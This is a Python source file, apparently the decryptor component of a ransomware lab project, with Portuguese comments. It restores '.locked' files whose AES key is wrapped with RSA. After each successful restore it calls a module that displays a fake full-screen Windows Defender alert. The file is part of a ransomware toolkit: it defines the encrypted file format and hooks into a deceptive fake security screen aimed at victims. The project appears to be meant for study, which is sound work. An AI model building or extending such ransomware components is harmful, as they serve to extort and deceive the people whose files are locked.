from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from hashlib import sha256
import json
import os
import sys
from datetime import datetime, timezone
from Crypto.Hash import SHA1
from ransom.fullscreen_fake_defender import trigger_defender_alert  # 🔥 Integração BRUTAL

MAGIC_BYTES = b'LOCKED_RANSOMLAB'

def decrypt_file(encrypted_path, private_key_path, uid):
    try:
        with open(encrypted_path, 'rb') as f:
            magic = f.read(len(MAGIC_BYTES))
            if magic != MAGIC_BYTES:
                print("[-] Magic bytes inválidos.")
                return

            key_size = int.from_bytes(f.read(2), 'big')
            rsa_encrypted_key = f.read(key_size)
            iv = f.read(16)
            ciphertext = f.read()

        with open(private_key_path, 'rb') as kf:
            private_key = RSA.import_key(kf.read())

        cipher_rsa = PKCS1_OAEP.new(private_key, hashAlgo=SHA1)
        aes_key = cipher_rsa.decrypt(rsa_encrypted_key)

        cipher_aes = AES.new(aes_key, AES.MODE_CBC, iv)
        plaintext_padded = cipher_aes.decrypt(ciphertext)

        padding_len = plaintext_padded[-1]
        plaintext = plaintext_padded[:-padding_len]

        recovered_hash = sha256(plaintext).hexdigest()

        output_file = encrypted_path.replace('.locked', '')
        with open(output_file, 'wb') as f:
            f.write(plaintext)

        print(f"[+] Arquivo restaurado com sucesso: {output_file}")
        print(f"[+] SHA256 do conteúdo: {recovered_hash}")

        log = {
            "uid": uid,
            "original_file": output_file,
            "recovered_from": encrypted_path,
            "sha256": recovered_hash,
            "timestamp": datetime.now(timezone.utc).isoformat()
        }

        with open(f"log_recover_{uid}.json", 'w') as logf:
            json.dump(log, logf, indent=4)

        print(f"[+] Log salvo: log_recover_{uid}.json")

        # ⚠️ Invoca tela fake após sucesso (brutal visual)
        trigger_defender_alert(uid=uid)

    except ValueError as ve:
        print("[-] Falha ao descriptografar a chave AES. Verifique a chave privada.")
        print(f"[DEBUG] Erro interno: {ve}")
    except Exception as e:
        print("[-] Erro inesperado.")
        print(f"[DEBUG] {e}")


if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Uso: python core/decryptor.py <arquivo.locked> <private.pem> <UID>")
    else:
        decrypt_file(sys.argv[1], sys.argv[2], sys.argv[3])
